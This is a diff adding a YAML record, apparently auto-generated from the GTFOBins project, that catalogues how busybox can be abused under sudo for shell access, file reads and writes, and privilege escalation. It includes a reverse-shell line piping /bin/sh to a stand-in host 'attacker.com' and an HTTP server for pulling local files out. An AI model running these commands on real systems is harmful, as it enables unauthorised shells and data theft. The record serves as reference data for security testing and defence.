@@ -1,0 +1,127 @@
+id: gtfobins/busybox/inherit/sudo
+type: binary
+platform: linux
+name: busybox
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- command-execution
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: busybox ash
+- template: busybox cat
+references:
+- https://gtfobins.github.io/gtfobins/busybox/
+- https://gtfobins.github.io/gtfobins/ash/
+- https://gtfobins.github.io/gtfobins/cat/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        busybox:
+          comment: BusyBox may contain many utilities, run `busybox --list-full` to check what other binaries
+            are supported.
+          functions:
+            inherit:
+            - code: busybox ash
+              contexts:
+                sudo: null
+                unprivileged: null
+              from: ash
+            - code: busybox cat
+              contexts:
+                sudo: null
+                unprivileged: null
+              from: cat
+            reverse-shell:
+            - code: busybox nc -e /bin/sh attacker.com 12345
+              contexts:
+                sudo: null
+                unprivileged: null
+              listener: tcp-server
+            upload:
+            - code: busybox httpd -f -p 12345 -h .
+              comment: This serves files in the local folder via an HTTP server.
+              contexts:
+                sudo: null
+                unprivileged: null
+              receiver: http-client
+        ash:
+          functions:
+            file-write:
+            - code: ash -c 'echo DATA >/path/to/output-file'
+              contexts:
+                sudo: null
+                suid:
+                  code: ash -p -c 'echo DATA >/path/to/output-file'
+                unprivileged: null
+            shell:
+            - code: ash
+              contexts:
+                sudo: null
+                suid:
+                  code: ash -p
+                unprivileged: null
+        cat:
+          functions:
+            file-read:
+            - code: cat /path/to/input-file
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+    upstream_url: https://gtfobins.github.io/gtfobins/busybox/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: heuristic
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+      note: Upstream inherit activation snippet; no downstream capability is inferred from its target.
+    confidence:
+      level: low
+  phases:
+  - value: execution
+    provenance:
+      type: heuristic
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+      note: Upstream inherit activation snippet; no downstream capability is inferred from its target.
+    confidence:
+      level: low
+  - value: privilege-escalation
+    provenance:
+      type: heuristic
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+      note: Upstream inherit activation snippet; no downstream capability is inferred from its target.
+    confidence:
+      level: low
+  privilege_required:
+    value: sudo
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:374f2a0fb02eeb385fe9de2ffb1391516d18e864662046c31fbf3569e65f2938
